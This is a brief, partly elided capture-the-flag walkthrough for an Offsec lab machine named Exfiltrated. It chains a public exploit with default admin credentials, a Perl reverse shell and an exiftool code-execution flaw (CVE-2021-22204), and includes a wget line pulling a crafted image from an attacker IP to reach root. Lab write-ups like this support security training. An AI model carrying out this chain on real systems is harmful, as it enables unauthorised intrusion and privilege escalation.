###### tags: `Offsec` `PG Practice` `Easy` `Linux` # Exfiltrated
```
┌──(kali㉿kali)-[~/pgplay]
...
``` [edb-49876](https://www.exploit-db.com/exploits/49876),use`admin/admin`can log in
```
┌──(kali㉿kali)-[~/pgplay]
...
$ whoami
www-data
``` useperl[reverseshell](https://www.revshells.com/)use
```
┌──(kali㉿kali)-[~/pgplay]
...
``` use`linpeas.sh`,findscript`/opt/image-exif.sh`
```
...
``` googleSearch[CVE-2021-22204](https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/)can
```
┌──(kali㉿kali)-[~/pgplay]
...
```,`/var/www/html/subrion/uploads`,download.jpg,cronRun
```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.209/exploit.jpg
``` wait for reverse shell/rootdirectoryget proof.txt,`/home/coaran`get local.txt
```
# python3 -c 'import pty; pty.spawn("/bin/bash")'
